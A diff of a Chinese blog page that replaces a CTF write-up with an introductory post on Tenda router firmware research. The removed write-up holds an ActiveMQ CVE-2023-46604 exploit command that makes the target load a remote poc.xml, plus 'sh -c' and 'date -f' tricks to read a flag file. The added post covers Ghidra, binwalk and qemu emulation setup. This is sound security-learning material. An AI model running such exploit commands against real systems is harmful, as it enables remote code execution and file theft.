@@ -20,20 +20,20 @@
     var CONFIG = {"hostname":"ha0-y.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":18,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="看到WP的我大吃一惊">
+  <meta name="description" content="更适合PWNer的漏洞挖掘尝试  编译ghidraLinux可以使用包管理器下载，windows也可以直接下载release里的内容。 编译结果在build&#x2F;dist&#x2F;，是一个压缩包，这样每次更新就重新编译，不用每次更新下载release了 12PS&gt; gradle -I gradle&#x2F;support&#x2F;fetchDependencies.gradle initPS&gt; gradle b">
 <meta property="og:type" content="website">
-<meta property="og:title" content="RW体验赛">
-<meta property="og:url" content="https://ha0-y.github.io/todo/RW%E4%BD%93%E9%AA%8C%E8%B5%9B.html">
+<meta property="og:title" content="Tenda 漏洞挖掘">
+<meta property="og:url" content="https://ha0-y.github.io/todo/Tenda%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.html">
 <meta property="og:site_name" content="ham5ter">
-<meta property="og:description" content="看到WP的我大吃一惊">
+<meta property="og:description" content="更适合PWNer的漏洞挖掘尝试  编译ghidraLinux可以使用包管理器下载，windows也可以直接下载release里的内容。 编译结果在build&#x2F;dist&#x2F;，是一个压缩包，这样每次更新就重新编译，不用每次更新下载release了 12PS&gt; gradle -I gradle&#x2F;support&#x2F;fetchDependencies.gradle initPS&gt; gradle b">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-02-03T07:27:51.830Z">
-<meta property="article:modified_time" content="2024-02-03T07:27:51.830Z">
+<meta property="article:published_time" content="2024-03-07T12:25:26.713Z">
+<meta property="article:modified_time" content="2024-03-07T12:25:26.713Z">
 <meta property="article:author" content="ham5ter">
 <meta property="article:tag" content="Blog">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://ha0-y.github.io/todo/RW%E4%BD%93%E9%AA%8C%E8%B5%9B">
+<link rel="canonical" href="https://ha0-y.github.io/todo/Tenda%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">
 
 
 <script id="page-configurations">
@@ -46,7 +46,7 @@
   };
 </script>
 
-  <title>RW体验赛 | ham5ter
+  <title>Tenda 漏洞挖掘 | ham5ter
 </title>
   
 
@@ -187,7 +187,7 @@
     <div class="post-block" lang="zh-CN">
       <header class="post-header">
 
-<h1 class="post-title" itemprop="name headline">RW体验赛
+<h1 class="post-title" itemprop="name headline">Tenda 漏洞挖掘
 </h1>
 
 <div class="post-meta">
@@ -202,35 +202,43 @@
       
       <div class="post-body">
           <blockquote>
-<p>看到WP的我大吃一惊</p>
+<p>更适合PWNer的漏洞挖掘尝试</p>
 </blockquote>
-<span id="more"></span>
+<h2 id="编译ghidra"><a href="#编译ghidra" class="headerlink" title="编译ghidra"></a>编译ghidra</h2><p>Linux可以使用包管理器下载，windows也可以直接下载release里的内容。</p>
+<p>编译结果在<code>build/dist/</code>，是一个压缩包，这样每次更新就重新编译，不用每次更新下载release了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS&gt; gradle -I gradle/support/fetchDependencies.gradle init</span><br><span class="line">PS&gt; gradle buildGhidra</span><br></pre></td></tr></table></figure>
 
-<h2 id="Be-an-ActiveMq-Hacker"><a href="#Be-an-ActiveMq-Hacker" class="headerlink" title="Be-an-ActiveMq-Hacker"></a>Be-an-ActiveMq-Hacker</h2><p>给了Dockerfile，首先在本地试试。提示给的是 <code>CVE-2023-46604</code>，直接搜索CVE的PoC就行。</p>
+<h2 id="获取固件"><a href="#获取固件" class="headerlink" title="获取固件"></a>获取固件</h2><p>iot设备，先去看一下它的历史漏洞，也许可以从中得到一些启发，因此首先在cve网站上搜索一下tenda，看看近期的漏洞比较多</p>
+<p>然后再 <a target="_blank" rel="noopener" href="https://www.tendacn.com/download/default.html">官方下载网站</a>网站上搜索对应的下载，挑选一个</p>
 <ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/X1r0z/ActiveMQ-RCE">ActiveMQ RCE CVE-2023-46604</a></li>
+<li>因为想学习ARM，所以挑选一个ARM路由器</li>
+<li>跟着<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13506?u_atoken=0a846aa522f55785603dd1ccc649f4c3&u_asession=01tFp34lZMpAiJpnQFdUO7oVSOJdEGnhA4z2Y5srynIIQ66V_k97MLFnlG50ZnCihYdlmHJsN3PcAI060GRB4YZGyPlBJUEqctiaTooWaXr7I&u_asig=05SQvJqhCrg6LZqd0x0eaeaW2dL2y9JORHBh4G0s7ciZE8JvDMy6BOILSRQkoTXrYpdSXqLbneUnt9HBCFmj5xlnXK6ICcUKV0poop15p7Me8Y2TDjBdP5GYv-HIpvPQHVOaBQwNo_fHOe4PjLLjoDLgaxbPBE2Reh2u4i_MBKwkJg2QMxYs6lyXb1lFWKql567wElq-8P7j_ysVM5g1MIsI9s0WPv3z-OEj9UpfJKo1VXRQhKc-8vrgnCeD8o5bQIp5YY5uMpFuoMkfGoGAR5MMT5F_AayFjmUVyTxvaU7oF6gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&u_aref=zohqtlIDtUaoiBsFWIIhQeXphts=&time__1311=n4+xyD07i=itvxQqGNnlG8DCieGQzD9GnoD&alichlgref=https://xz.aliyun.com/t/13506">这篇文章</a>复现，看能不能发现新东西</li>
 </ul>
-<p>python启动一个http服务</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m http.server 8000</span><br></pre></td></tr></table></figure>
+<h2 id="解包固件"><a href="#解包固件" class="headerlink" title="解包固件"></a>解包固件</h2><p><a target="_blank" rel="noopener" href="https://github.com/ReFirmLabs/binwalk">binwalk</a>: 可以分析并且解包</p>
+<p>没有加密，因此可以使用binwalk解包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -e, --extract                Automatically extract known file types</span></span><br><span class="line"><span class="comment"># -M, --matryoshka             Recursively scan extracted files</span></span><br><span class="line"><span class="comment"># 可以递归解包</span></span><br><span class="line">$ binwalk -Me xxx.bin</span><br></pre></td></tr></table></figure>
 
-<p>touch 文件失败？然后尝试反弹shell，也失败了？</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/evkl1d/CVE-2023-46604">evkl1d&#x2F;CVE-2023-46604</a></li>
-</ul>
-<p>赛后看WP，猛然意识到不该使用 <code>127.0.0.1</code> 这个IP，而是应该 <code>ifconfig</code> 后的IP。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 错误的🤡</span></span><br><span class="line">$ python exploit.py -i 127.0.0.1 -p 61616 -u http://127.0.0.1:8000/poc.xml</span><br><span class="line"><span class="comment"># 正确的</span></span><br><span class="line">$ python exploit.py -i 127.0.0.1 -p 61616 -u http://&lt;ip&gt;:8000/poc.xml</span><br></pre></td></tr></table></figure>
+<p>比较重要的是文件系统：<code>squashfs</code>，Squashfs 是 Linux 的压缩只读文件系统。</p>
+<p>它使用 zlib、lz4、lzo 或 xz 压缩来压缩文件、索引节点和 目录。系统中的索引节点非常小，所有块都打包到 最大限度减少数据开销。支持大于 4K 的块大小，最高支持 最大 1MB（默认块大小 128K）。</p>
+<p>Squashfs 用于一般只读文件系统，用于存档 使用（即在可以使用.tar.gz文件的情况下）和受限 块设备&#x2F;内存系统（例如嵌入式系统），其中低开销为 需要。</p>
+<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>有资金可以买个设备，效果更好。没资金的就虚拟运行</p>
+<h3 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h3><p>下载静态编译的qemu-user，避免某些动态链接库导致运行错误</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install qemu-user-static</span><br></pre></td></tr></table></figure>
 
-<h2 id="vision"><a href="#vision" class="headerlink" title="vision"></a>vision</h2><p>一个 <code>rshell</code>，支持如下的命令</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Supported commands: ping, uname, pwd, date, whoami, poweroff, id, showKey, openthedoor</span><br></pre></td></tr></table></figure>
+<h3 id="虚拟网桥"><a href="#虚拟网桥" class="headerlink" title="虚拟网桥"></a>虚拟网桥</h3><p>bridge是一个虚拟网络设备，所以具有网络设备的特征，可以配置IP、MAC地址等；其次，bridge是一个虚拟交换机，和物理交换机有类似的功能。</p>
+<p>添加一个虚拟网桥并且获得IP地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo brctl addbr br0</span><br><span class="line">$ sudo brctl addif br0 ens32</span><br><span class="line">$ sudo ifconfig br0 up</span><br><span class="line">$ sudo dhclient br0</span><br></pre></td></tr></table></figure>
 
-<p>问题出现在下面的代码里</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="built_in">sizeof</span>(command));</span><br><span class="line">space = <span class="built_in">strchr</span>(input, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ( space )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">strncpy</span>(command, input, space - input);   <span class="comment">// 取命令</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  n = <span class="built_in">strlen</span>(input);</span><br><span class="line">  <span class="built_in">strncpy</span>(command, input, n);</span><br><span class="line">&#125;</span><br><span class="line">len = <span class="built_in">strlen</span>(command);</span><br><span class="line"><span class="keyword">if</span> ( len )</span><br><span class="line">&#123;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v10 = shell[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">strncmp</span>(v10, command, len) )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = shell[++v7];</span><br><span class="line">    <span class="keyword">if</span> ( !shell[v7] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(echo, <span class="string">&quot;Not Support 4. \n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v23;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>也可以使用如下命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ip <span class="built_in">link</span> add name br0 <span class="built_in">type</span> bridge</span><br><span class="line">$ sudo ip <span class="built_in">link</span> <span class="built_in">set</span> br0 up</span><br></pre></td></tr></table></figure>
 
-<p>使用 <code>strncmp</code>进行判断，长度是我们输入的字符长度。因此我们输入 <code>sh</code> 也是一个合法的（showKey。因此可以使用如下的命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">&#x27;cat flag&#x27;</span></span><br></pre></td></tr></table></figure>
+<h3 id="FAT"><a href="#FAT" class="headerlink" title="FAT"></a>FAT</h3><p><a target="_blank" rel="noopener" href="https://github.com/attify/firmware-analysis-toolkit">firmware-analysis-toolkit</a> &amp;&amp; <a target="_blank" rel="noopener" href="https://github.com/firmadyne/firmadyne">firmadyne</a>进行模拟</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>tenda 路由器的web启动程序通常是bin目录下的httpd文件，我们的漏洞挖掘也是通过这个文件入手</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-arm-static) .</span><br><span class="line">$ sudo <span class="built_in">chroot</span> ./ ./qemu-arm-static ./bin/httpd</span><br></pre></td></tr></table></figure>
 
-<p>并且date命令可以读取文件:<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/date/">date | GTFOBins</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">date</span> -f flag</span><br></pre></td></tr></table></figure>
+<h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>从危险函数入手</p>
+<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>还是从危险函数入手</p>
+
       </div>
       
       
@@ -291,7 +299,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Be-an-ActiveMq-Hacker"><span class="nav-number">1.</span> <span class="nav-text">Be-an-ActiveMq-Hacker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vision"><span class="nav-number">2.</span> <span class="nav-text">vision</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E8%AF%91ghidra"><span class="nav-number">1.</span> <span class="nav-text">编译ghidra</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%9B%BA%E4%BB%B6"><span class="nav-number">2.</span> <span class="nav-text">获取固件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E5%8C%85%E5%9B%BA%E4%BB%B6"><span class="nav-number">3.</span> <span class="nav-text">解包固件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C"><span class="nav-number">4.</span> <span class="nav-text">运行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#qemu"><span class="nav-number">4.1.</span> <span class="nav-text">qemu</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%99%9A%E6%8B%9F%E7%BD%91%E6%A1%A5"><span class="nav-number">4.2.</span> <span class="nav-text">虚拟网桥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FAT"><span class="nav-number">4.3.</span> <span class="nav-text">FAT</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">5.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-number">5.1.</span> <span class="nav-text">栈溢出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-number">5.2.</span> <span class="nav-text">命令注入</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
